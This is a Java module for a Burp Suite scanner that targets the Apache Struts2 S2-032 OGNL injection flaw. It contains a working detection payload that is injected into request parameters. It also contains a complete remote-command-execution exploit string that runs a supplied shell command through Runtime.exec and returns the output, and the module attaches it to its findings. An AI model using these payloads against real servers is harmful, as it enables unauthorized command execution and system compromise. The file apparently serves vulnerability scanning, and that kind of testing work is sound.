package module.java.vul;

import burp.*;
import module.Util;

import java.io.PrintWriter;
import java.net.URLEncoder;
import java.util.Arrays;

public class S2_032 extends IModule {
    public String randomMark = Util.getRandomString(16);
    public String[] injectMark = new String[]{
            Arrays.toString(randomMark.substring(0, 9).getBytes()).replace("[", "").replace("]", ""),
            Arrays.toString(randomMark.substring(9, 16).getBytes()).replace("[", "").replace("]", "")
    };
    public String poc =
            "method:" +
            "#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS," +
            "#w=@org.apache.struts2.ServletActionContext@getResponse().getWriter()," +
            "#w.print(new java.lang.String(new byte[]{" + injectMark[0] + "}))," +
            "#w.print(new java.lang.String(new byte[]{" + injectMark[1] + "}))," +
            "#w.flush()," +
            "#w.close()," +
            "1?#xx:#request.toString";
    public String exp =
            "method:" +
            "#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS," +
            "#res=@org.apache.struts2.ServletActionContext@getResponse()," +
            "#res.setCharacterEncoding(#parameters.encoding[0])," +
            "#w=#res.getWriter()," +
            "#s=new java.util.Scanner(@java.lang.Runtime@getRuntime().exec(#parameters.cmd[0]).getInputStream()).useDelimiter(#parameters.pp[0])," +
            "#str=#s.hasNext()?#s.next():new java.lang.String(new byte[]{32})," +
            "#w.print(#str)," +
            "#w.close()," +
            "1?#xx:#request.toString" +
            "&pp=\\\\a" +
            "&ppp= &" +
            "encoding=UTF-8" +
            "&cmd=whoami";


    @Override
    public IScanIssue start() {
        IHttpService httpService = iHttpRequestResponse.getHttpService();
        IRequestInfo requestInfo = helpers.analyzeRequest(iHttpRequestResponse);
        byte[] request = iHttpRequestResponse.getRequest();

        byte in = (byte) 0;
        if (requestInfo.getMethod().equals("POST")) {
            in = (byte) 1;
        }
        IParameter newParameter = helpers.buildParameter(URLEncoder.encode(poc), "1", in);
        byte[] newRequest = helpers.updateParameter(request, newParameter);

        IHttpRequestResponse newHttpRequestResponse = callbacks.makeHttpRequest(httpService, newRequest);
        byte[] response = newHttpRequestResponse.getResponse();
        String responseText = helpers.bytesToString(response);

        if (responseText.contains(randomMark)) {
            this.iHttpRequestResponse = newHttpRequestResponse;
            this.detail = exp;
            return creatCustomScanIssue();
        }
        return null;
    }
}
